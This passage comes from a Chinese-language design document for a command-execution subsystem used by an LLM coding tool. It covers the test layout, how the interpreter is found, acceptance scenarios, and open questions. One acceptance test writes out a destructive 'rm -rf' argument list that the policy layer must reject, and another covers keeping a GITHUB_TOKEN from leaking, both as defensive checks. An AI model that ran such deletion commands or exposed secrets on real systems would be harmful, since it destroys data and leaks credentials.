├── artifact_io.py          # memory_tool.py artifact put/page 薄适配 + 回读校验
└── cli.py                  # exec run / exec diff / exec baseline（kill 未实现）
tests/exec/
├── test_runner.py          # 执行/超时/取消/命令不存在/内存有界
├── test_proc_tree.py       # 孙进程被终止；tree_leaked 记账
├── test_sink.py            # 内存恒有界、dropped_bytes、spill 上限
├── test_env_redact.py      # allowlist 继承、敏感变量不泄露、脱敏不误伤
├── test_normalizers.py     # 各框架样本 + truncated 时不造假结论
├── test_fingerprint.py     # 跨进程稳定（子进程复算同值）、重置规则表逐条
├── test_diff.py            # 六类改动 + 重命名 + 未跟踪 + 非 git 基线
└── test_artifact_io.py     # put 失败/回读失败/字节上限
```

**依赖**：`artifact_io.py` 经 argv 数组调 `memory_tool.py artifact put/page`（不改 memory_tool.py，复用其 CLI）。**调用方式定案（原 U10）**：**subprocess CLI**——① 解耦：Core/Exec 崩了 memory_tool 仍可用；② 不引入"同进程 + 全局状态"的隐式耦合；③ 每阶段调用次数是个位数，subprocess 开销可忽略。若将来 `feed_exec` 变成高频路径，再引入常驻 worker（留 Phase 4），**不提前优化**。

**Python 解释器发现**（不假定 `python3`）：

```text
1. --python / VIBE_KERNEL_PYTHON（显式）
2. sys.executable（若 Exec 自身运行在 Python 中，直接复用——最可靠）
3. PATH 中的 python3 → python → py -3（Windows）
校验：执行 --version 且 major.minor >= 3.10；失败继续下一个；全失败 → ENV_ERROR（不静默降级）
```

---

## 九、验收场景

| # | 场景 | 期望 |
|---|---|---|
| E1 | pytest 全过 | ok=True，pass_count 正确，无 artifact 外置 |
| E2 | pytest 部分失败 | ok=False，fail_count + error_summaries + fingerprint |
| E3 | 输出超 `max_output_bytes` | 外置 + ref + `OUTPUT_LIMIT` + `[next] 分页续取`；`stdout_head` 仍可用 |
| E3b | 输出持续不断（`yes`/大构建日志），限 200MB | **RSS 峰值 ≤ 基线 + 2×max_output_bytes**（验证流式而非事后限流） |
| E3c | 落盘超 `max_spill_bytes` | `dropped_bytes>0`、`truncated=True`、`ref=None`、不 OOM |
| E4 | 命令不存在 | `ENV_ERROR`，不消耗 Loop |
| E5 | 超时 | `TIMEOUT`，**整进程树**被终止（孙进程不存活） |
| E5b | 取消（`cancel_event`） | `CANCELLED`，同样整树终止 |
| E5c | 孙进程拒绝退出（忽略 SIGTERM） | 3s 宽限后 SIGKILL；仍残留 → `tree_leaked=True` 记账，**不谎报已终止** |
| E6 | 同一失败连续 2 次 | `repeat_check` 返回 `NO_PROGRESS` |
| E6b | 同一 `exec_id` 重复 feed | 幂等：`consecutive_count` 不加两次 |
| E6c | 连续计数跨"进程重启" | 从 `review.failure_state` 读回，仍能触发 `NO_PROGRESS` |
| E6d | A→B→A 三次失败 | **不**触发 `NO_PROGRESS`（中间有变化，非连续） |
| E7 | 不同失败（改了代码） | 指纹变化，`count` 归 1 |
| E7b | 同错误跨 S8/S9 | 指纹**相同**（stage 不进指纹），仍能累积连续 |
| E7c | 子进程复算同一输入 | 指纹逐字节相同（验证无 `hash()` 随机化） |
| E8 | git diff 含新增+修改+删除 | 三类正确，insertions/deletions 正确 |
| E8b | 已 `git add` 但未提交 | 计入（`--cached` 路径） |
| E8c | **未跟踪新文件** | 计入 `untracked`，并参与 `plan_drift` |
| E8d | 重命名（`--find-renames`） | 记为 rename，**不**算成"删+增" |
| E9 | 触及 auth 文件 | `high_risk_files` 命中 |
| E10 | 实际修改 ⊄ plan_files | `plan_drift.unplanned` 非空 → `PLAN_DRIFT` |
| E10b | 计划声明了但没改 | `plan_drift.missing` 非空 |
| E10c | Windows 路径大小写差异 / 反斜杠 | 不产生假漂移 |
| E11 | 非 git 项目首次调用 | 自动建基线快照；第二次调用能算出 added/modified/deleted |
| E11b | 基线创建失败（只读目录） | `plan_drift=None` + `degraded_reason="no_baseline"`（**不报"无漂移"**） |
| E12 | eslint 0 error | ok=True，kind=lint |
| E13 | artifact page 分页取 stdout | ref 有效，分页返回，超 limit 报 `OUTPUT_LIMIT` |
| E13b | `artifact put` 失败 | `ref=None` + `artifact_error` + `head` 可用；**不返回坏 ref** |
| E14 | env 策略 | allowlist 项（PATH/HOME/Windows 必需项）存在；未列入的宿主变量不出现 |
| E14b | 宿主里有 `GITHUB_TOKEN` | 子进程环境**无**该变量；若命令把它打到输出 → 输出被脱敏 + `env_redactions>0` |
| E15 | `shell=False` 但参数是 `["rm","-rf","/x"]` | 被 `policy` 拒绝（`SCOPE_DENIED`）——验证"注入层 ≠ 行为层" |
| E16 | `summarize_diff` 200 文件项目 | < 300ms（三次 git 调用，非逐文件） |

**退出条件**：E1–E16 全绿；**E3b/E5/E5c/E14b 为必测项**（这四项直接对应原设计的真实缺陷）；LLM 可经 `cli.py` 手动调 `exec run`/`exec diff` 跑真实任务；memory_tool.py artifact 子系统**未被修改**（复用不改）。

---

## 十、未决问题

| # | 问题 | 结论 / 倾向 | 状态 |
|---|---|---|---|
| U9 | 失败指纹历史存哪里？ | **已定案**：`.state.md` → `review.failure_state`（保留扩展子键，不进顶层，不改 13 字段） | ✅ 关闭（§5.4） |
| U10 | 调 artifact 的方式 | **已定案**：subprocess CLI（解耦 + 低频）；高频路径留 Phase 4 worker | ✅ 关闭（§八） |
| U11 | 归一化器是否可配置 | MVP-2 内置常见框架；自定义走 `unknown` 降级。不预抽象配置层 | 🟡 保持 |
| U12 | Diff 的 `base` 如何定 | **已定案**：缺省 `HEAD`；可经 `--base`/config 覆盖；空仓库自动降级为快照基线 | ✅ 关闭（§6.3） |
| U21 | 高风险命令清单的维护归属 | 倾向：内置清单 + 项目可**追加**（不可删除内置项）；清单变更需记录 `decisions`，避免"悄悄放宽" | 🟡 待决策 |
| U22 | 脱敏是否可能误伤正常输出（高熵串） | 倾向：只脱敏"命中已知前缀"或"等于 env 中敏感变量的实际值"两类；纯随机 base64 不脱敏，宁可漏也不误伤（误伤会破坏 diff/哈希比对） | 🟡 待决策 |
| U23 | pinned artifact 生产侧是否该自动 pin | 倾向：Stage ∈ {S9,S10} 的**失败**输出自动 pin，其余 ephemeral；避免全量 pin 占盘 | 🟡 待决策 |
